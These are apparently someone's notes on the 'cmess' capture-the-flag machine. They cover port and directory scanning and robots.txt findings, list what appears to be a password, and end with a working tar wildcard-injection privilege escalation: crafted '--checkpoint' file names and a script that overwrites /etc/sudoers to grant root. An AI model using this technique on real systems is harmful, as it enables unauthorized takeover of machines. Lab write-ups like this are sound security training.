###### cmess

first rust scan

export IP=10.10.35.116

rustscan -u 5000 -r 1-65535 -a $IP gives us 80 and 22

ffuf -u http://cmess.thm/FUZZ -w /home/srini/Tools/SecLists/Discovery/Web-Content/common.txt

http://cmess.thm/tmp/?url=tmp - formbidden, same for src,lib

robots.txt
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/

UQfsdCB7aAP6

andre@cmess:~/backup$ echo 'echo "andre ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers' > test.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh test.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
andre@cmess:~/backup$ ls -la
total 24
drwxr-x--- 2 andre andre 4096 May  8 08:31 .
drwxr-x--- 4 andre andre 4096 Feb  9  2020 ..
-rw-rw-r-- 1 andre andre    1 May  8 08:31 --checkpoint=1
-rw-rw-r-- 1 andre andre    1 May  8 08:31 --checkpoint-action=exec=sh test.sh
-rwxr-x--- 1 andre andre   51 Feb  9  2020 note
-rw-rw-r-- 1 andre andre   56 May  8 08:31 test.sh
andre@cmess:~/backup$ chmod +x test.sh